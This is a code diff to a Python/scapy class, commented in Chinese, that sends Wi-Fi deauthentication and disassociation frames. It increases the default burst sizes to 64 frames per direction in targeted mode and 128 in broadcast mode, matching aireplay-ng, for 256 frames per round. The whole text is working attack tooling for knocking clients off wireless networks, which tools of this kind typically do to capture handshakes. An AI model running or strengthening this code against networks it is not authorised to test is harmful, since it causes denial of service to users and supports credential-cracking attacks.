@@ -12,8 +12,8 @@
        deauth STA→AP = 1
        disas  双向   = 8
   3) 组 burst 列表后一次 sendp(burst, inter=0.003)
-  4) 精准: 4 向 × 16 = 64 帧/轮；广播: 2 向 × 32 = 64 帧/轮
-  5) 默认连打 rounds 轮（参考脚本爆发阶段 ×4 → 256 帧）
+  4) 精准: 4 向 × 64 = 256 帧/轮；广播: 2 向 × 128 = 256 帧/轮
+  5) 默认连打 rounds 轮（参考脚本爆发阶段 ×4 → 1024 帧/次爆发）
 
 依赖可选: python3-scapy。无 scapy 时返回 0，由 aireplay 兜底。
 """
@@ -104,14 +104,14 @@ class ScapyDeauth(object):
         ) / Dot11Disas(reason=8))
 
         if client:
-            # 精准: 4 向 × n（参考 16 → 64 帧/轮）
+            # 精准: 4 向 × n（默认 64 → 256 帧/轮，对齐 aireplay-ng 有向 64）
             return (
                 [deauth_ap] * n
                 + [deauth_cl] * n
                 + [disas_ap] * n
                 + [disas_cl] * n
             )
-        # 广播: 只打 AP→广播 的 deauth/disas（参考 32+32）
+        # 广播: 只打 AP→广播 的 deauth/disas（默认 128+128，对齐 aireplay-ng 广播 128）
         return [deauth_ap] * n + [disas_ap] * n
 
     @classmethod
@@ -126,7 +126,7 @@ class ScapyDeauth(object):
     ) -> int:
         """注入 deauth+disassoc。返回成功送出的帧数估计（失败 0）。
 
-        count: 每向复制次数（精准默认 16，广播默认 32）
+        count: 每向复制次数（精准默认 64，广播默认 128）
         rounds: 连发轮数（默认 4，对齐参考「爆发 ×4」）
         inter: sendp 帧间隔秒（默认 0.003）
         """
@@ -147,21 +147,22 @@ class ScapyDeauth(object):
         if not iface or not is_safe_iface(iface):
             return 0
 
-        # 每向份数：有 count 用 count；否则精准 16 / 广播 32
+        # 每向份数：有 count 用 count；否则精准 64 / 广播 128（对齐
+        # aireplay-ng 源码 do_attack_deauth：有向 64 帧、广播 128 帧）
         if count is not None:
             try:
-                per_dir = max(1, min(64, int(count)))
+                per_dir = max(1, min(128, int(count)))
             except (TypeError, ValueError):
-                per_dir = 16 if client else 32
+                per_dir = 64 if client else 128
         else:
             try:
                 cfg = int(getattr(Configuration, 'scapy_deauth_count', 0) or 0)
             except (TypeError, ValueError):
                 cfg = 0
             if cfg > 0:
-                per_dir = max(1, min(64, cfg))
+                per_dir = max(1, min(128, cfg))
             else:
-                per_dir = 16 if client else 32
+                per_dir = 64 if client else 128
 
         try:
             gap = float(inter if inter is not None
